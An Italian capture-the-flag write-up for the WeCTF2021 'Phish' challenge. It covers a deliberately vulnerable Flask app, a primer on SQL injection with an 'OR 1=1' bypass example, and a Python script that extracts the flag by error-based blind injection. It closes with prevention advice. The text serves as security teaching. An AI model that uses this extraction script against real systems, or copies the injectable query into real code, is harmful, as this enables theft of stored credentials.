Esecuzione della sfida in locale

Per poter eseguire la sfida in locale effetuare il clone della repository :

 git clone https://github.com/pierde98/CTF.git

Entrare nella directory della sfida e istanziare il container Docker :

cd WeCTF2021-Phish/phish-challenge
docker-compose up -d

L’applicazione web della sfida è in esecuzione su: http://localhost:4008/

Analisi preliminare

La descrizione di questa sfida è la seguente:
“Shou is so dumb that he leaks his password (flag) to a phishing website.”
La web app della sfida consiste in un sito di phishing che ci chiede email e password. Dalla descrizione sappiamo che l’utente “shou” ha fatto trapelare la sua password su questo sito, la quale corrisponde al flag della sfida.

La pagina iniziale del sito web è così fatta.

Se proviamo ad inserire credenziali casuali viene visualizzata una pagina che ci dice che la nostra password è trapelata.

Analizziamo il codice sorgente main.py che abbiamo a dispozione all’interno della subdirectory phish-challenge.

import os

from flask import Flask, render_template, request
from peewee import *

app = Flask(__name__)

db = SqliteDatabase("core.db")


class User(Model):
    id = AutoField()
    password = CharField()
    username = CharField(unique=True)

    class Meta:
        database = db


@db.connection_context()
def initialize():
    try:
        db.create_tables([User])
        User.create(username="shou", password=os.getenv("FLAG"))
    except:
        pass


initialize()


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/add", methods=["POST"])
def add():
    username = request.form["username"]
    password = request.form["password"]
    sql = f"INSERT INTO `user`(password, username) VALUES ('{password}', '{username}')"
    try:
        db.execute_sql(sql)
    except Exception as e:
        return f"Err: {sql} <br>" + str(e)
    return "Your password is leaked :)<br>" + \
           """<blockquote class="imgur-embed-pub" lang="en" data-id="WY6z44D"  ><a href="//imgur.com/WY6z44D">Please 
        take care of your privacy</a></blockquote><script async src="//s.imgur.com/min/embed.js" 
        charset="utf-8"></script> """


if __name__ == "__main__":
    app.run()

Questa applicazione web utilizza il framework Flask in Python per creare un’applicazione web. Utilizza un database SQLite per archiviare i dati degli utenti. La classe “User” definisce i campi id, password e username per gli utenti. Il campo username è unico, il che significa che non ci possono essere due utenti con lo stesso nome. La funzione “initialize” crea la tabella “user” e crea un utente di nome “shou” con la password che, appunto, corrisponde al flag.
La funzione “index” gestisce la richiesta alla radice “/” del server e restituisce una pagina HTML “index.html” come risposta.
La funzione “add” gestisce le richieste POST alla rotta “/add”.
Raccoglie i dati inseriti dall’utente nei campi “username” e “password” dalla richiesta POST.

username = request.form["username"]
password = request.form["password"]

Crea una stringa di query SQL dinamicamente utilizzando gli input degli utenti.

sql = f"INSERT INTO `user`(password, username) VALUES ('{password}', '{username}')"

La query SQL non è protetta contro l’SQL injection. Questa stringa è vulnerabile perché gli input dell’utente (password e username) vengono inseriti direttamente nella stringa SQL senza essere protetti o convalidati.

Quindi per risolvere la sfida possiamo sfruttare la vulnerabilità SQLi per accedere al database dell’applicazione e recuperare la password che corrisponde al flag.

Per approfondire SQL Injection

L’SQL Injection è una vulnerabilità della sicurezza web che consente a un utente malintenzionato di interferire con le query che un’applicazione effettua sul proprio database. In genere consente a un utente malintenzionato di visualizzare dati che normalmente non è in grado di recuperare. Tra questi potrebbero esserci dati appartenenti ad altri utenti o qualsiasi altro dato a cui l’applicazione stessa è in grado di accedere. In molti casi, un utente malintenzionato può modificare o eliminare questi dati, causando modifiche persistenti al contenuto o al comportamento dell’applicazione.

In alcune situazioni, un aggressore può intensificare un attacco SQL injection per compromettere il server sottostante o un’altra infrastruttura back-end, oppure eseguire un attacco denial of service.

Esiste un’ampia varietà di vulnerabilità, attacchi e tecniche di SQL injection, che si presentano in situazioni diverse. Alcuni esempi comuni di SQL injection sono:

  • Recupero di dati nascosti, dove è possibile modificare una query SQL per restituire risultati aggiuntivi.

  • Sovvertimento della logica dell’applicazione, in cui è possibile modificare una query per interferire con la logica dell’applicazione.

  • Attacchi UNION, in cui è possibile recuperare dati da tabelle di database diverse.

  • Analisi del database, in cui è possibile estrarre informazioni sulla versione e sulla struttura del database.

  • Blind SQL injection, in cui i risultati di una query controllata dall’utente non vengono restituiti nelle risposte dell’applicazione.

Segue un esempio che mostra come un aggressore può utilizzare l’SQL injection per aggirare l’autenticazione di un’applicazione e ottenere i privilegi di amministratore.

Consideriamo un semplice sistema di autenticazione che utilizza una tabella di database con nomi utente e password. La richiesta POST di un utente fornisce le variabili user e pass, che vengono inserite in un’istruzione SQL:

sql = "SELECT id FROM users WHERE username='" + user + "' AND password='" + pass + "'"

Il problema è che l’istruzione SQL utilizza la concatenazione per combinare i dati. L’attaccante può fornire una stringa come questa al posto della variabile “pass”:

password' OR 1=1

La query SQL risultante verrà eseguita sul database:

SELECT id FROM users WHERE username='user' AND password='pass' OR 1=1'

Poiché 1=1 è una condizione che si valuta sempre come vera, l’intera istruzione WHERE sarà vera, indipendentemente dal nome utente o dalla password forniti.
L’istruzione WHERE restituirà il primo ID della tabella utenti, che di solito è l’amministratore. Ciò significa che l’aggressore può accedere all’applicazione senza autenticazione e ha anche i privilegi di amministratore.

Ovviamente questo è solo un esempio di come la vulrabilità trattata può essere sfruttata da un utente malintenzionato.

Risoluzione

Procediamo quindi con la risoluzione della sfida. Elaboriamo la soluzione procendendo come segue.

Acquisizione dei caratteri presenti nella password

Intendiamo acquisire i caratteri presenti nella password mediante il brute-forcing attraverso una query SQL come questa, dove ---CHAR--- è il carattere che stiamo testando:

INSERT INTO `user`(password, username) VALUES ('a',(SELECT password FROM user WHERE username = "shou" AND password LIKE "%---CHAR---%"));

Per spiegare come funziona, analizziamo prima l’istruzione SELECT:

SELECT password FROM user WHERE username = "shou" AND password LIKE "%---CHAR---%"

Sappiamo che esiste un nome utente “shou” con la password che corrisponde al flag.
Quindi, possiamo verificare se un carattere è presente nella password aggiungendo la condizione password LIKE "%---CHAR---%".
Questo funziona utilizzando la condizione LIKE, insieme al carattere jolly multiplo, %.

Se il carattere è presente, la nostra query restituirà: UNIQUE constraint failed: user.username
Questo perché l’istruzione SELECT restituisce “shou”, ma “shou” è già stato vittima di phishing e di conseguenza il suo nome utente è già presente all’interno del database, quindi non possiamo creare una nuova riga con il nome utente “shou”.

Se il carattere non è presente nella password, la nostra query restituirà:
NOT NULL constraint failed: user.username
Questo perché SQLite si aspetta che ci sia una stringa, ma non viene selezionato nulla perché la password di “shou” non contiene il carattere.

Acquisizione password mediante brute force

Dopo aver acquisito tutti i caratteri presenti nella password, è necessario capire come i caratteri sono ordinati tra loro. Possiamo procedere con un approccio molto simile a quello precedente ma facendo attenzione ad un aspetto. L’operatore di confronto LIKE non fa distinzione tra i caratteri maiuscoli e quelli minuscoli, ovvero "a" LIKE "a" è TRUE, e "A" LIKE "a" è ancora TRUE.
Il flag invece, potrebbe contenere sia caratteri minuscoli che maiuscoli quindi è necessario trovare un altro operatore.

Facciamo uso dell’operatore GLOB, che a differenza dell’operatore LIKE, fa distinzione tra maiuscole e minuscole ed ha * come carattere jolly.

Utilizziamo quindi un’iniezione simile a quella precedente, dove vogliamo che venga eseguita la seguente query, in cui ---HERE--- è una porzione del flag:

INSERT INTO `user`(password, username) VALUES ('a',(SELECT password FROM user WHERE username = "shou" AND password GLOB "---HERE---*"));

Analogamente alla prima parte, se il segmento del flag è corretto, restituisce:
UNIQUE constraint failed: user.username

Se il segmento non è corretto, restituisce: NOT NULL constraint failed: user.username

Script

Quello che segue è uno script Python (disponibile nella subdirectory solution) che ci consente di ottenere il flag utilizzando le query appena illustrate.

import requests, string, time

url = 'http://localhost:4008/add'
chars = string.printable
foundchars = ''
solvestr = 'we{'

for i in chars:
    send = {'username':'abc', 'password':f'a\',(SELECT password FROM user WHERE username = \"shou\" AND password LIKE \"%{i}%\")); --'}
    r = requests.post(url, data=send)
    if 'UNIQUE' in r.text: foundchars+=i
    time.sleep(0.1)
print(f'\n\n\n{(len(foundchars)+7)*"-"}\nFound: {foundchars}\n{(len(foundchars)+7)*"-"}\n\nTrying\t| Solved')

while solvestr[-1]!='}':
    for i in foundchars:
        send = {'username':'abc', 'password':f'a\',(SELECT password FROM user WHERE username = \"shou\" AND password GLOB \"{solvestr+i}*\"));--'}
        r = requests.post(url, data=send)
        if 'UNIQUE' in r.text: solvestr+=i
        print(f'{i}\t| {solvestr+i}', end='\r')
        time.sleep(0.1)
print(f'\n\nSolved: {solvestr}\n')

Il codice utilizza la libreria requests per effettuare richieste HTTP all’URL specificato. Impostiamo variabile “chars” con la stringa “string.printable” che contiene tutti i caratteri stampabili e la variabile “foundchars” come stringa vuota. La variabile “solvestr” sarà la stringa che conterrà il flag e viene inizializzata con “we{” dato che tutti i flag iniziano in questo modo.

In primo luogo, il codice utilizza un ciclo for per inviare richieste HTTP POST con una stringa che rappresenta una query SQL che cerca la password nella tabella “user” per un utente con username “shou”. La query utilizza l’operatore LIKE che cerca un singolo carattere seguito da un carattere jolly, ad esempio “%a%”. Se la query restituisce un risultato UNIQUE, allora il carattere cercato è presente nella password. Ovviamente facendo questo per ogni carattere nell’insieme di caratteri “chars”, che in questo caso è una stringa che rappresenta tutti i caratteri stampabili, si ottengono tutti caratteri presenti nella password.
Viene aggiunto time.sleep(0.1) per limitare le richieste a un massimo di 10 al secondo.

Nella restante porzione di codice vengono inviate richieste HTTP POST ma questa volta la query utilizza l’operatore GLOB che cerca la stringa iniziale “we{”, seguita da un carattere jolly. Se la query restituisce UNIQUE, allora la stringa iniziale rappresenta la porzione iniziale della password e aggiunge il carattere successivo. Questo viene fatto per ogni carattere nell’insieme di caratteri “foundchars”, che rappresenta i caratteri presenti nella password identificati durante la prima fase. Dato che tutti i flag sono del tipo “we{…}”, quando alla stringa “solvestr” viene aggiunto “}” vuol dire che abbiamo trovato tutti i caratteri del flag e quindi si esce dal ciclo while.

Nell’ultima riga viene stampata l’intera stringa contenente il flag.

Eseguendo lo script possiamo vedere che siamo in grado di ottenere il flag.

Sfida completata!

Come prevenire gli attacchi SQL Injection

Gli attacchi SQL Injection sono una delle forme più comuni di attacchi al database. Per prevenirli, è possibile adottare le seguenti misure:

  • Utilizzare query parametrizzate o stored procedure: invece di concatenare stringhe di codice SQL con input da parte dell’utente, utilizzare query parametrizzate o stored procedure consente di separare i dati dal codice SQL e di prevenire gli attacchi SQL Injection.

  • Sanitizzare i caratteri di input: è importante sanitizzare i caratteri speciali nell’input dell’utente, come apici singoli o doppi, per evitare che siano interpretati come parte del codice SQL.

  • Limitare i privilegi dell’utente del database: è importante limitare i privilegi dell’utente del database per impedire agli utenti malintenzionati di eseguire query dannose o di accedere a dati sensibili.

  • Validare e filtrare input dall’utente: è importante validare e filtrare sempre l’input dell’utente per evitare che siano inviati dati non validi o dannosi al database.
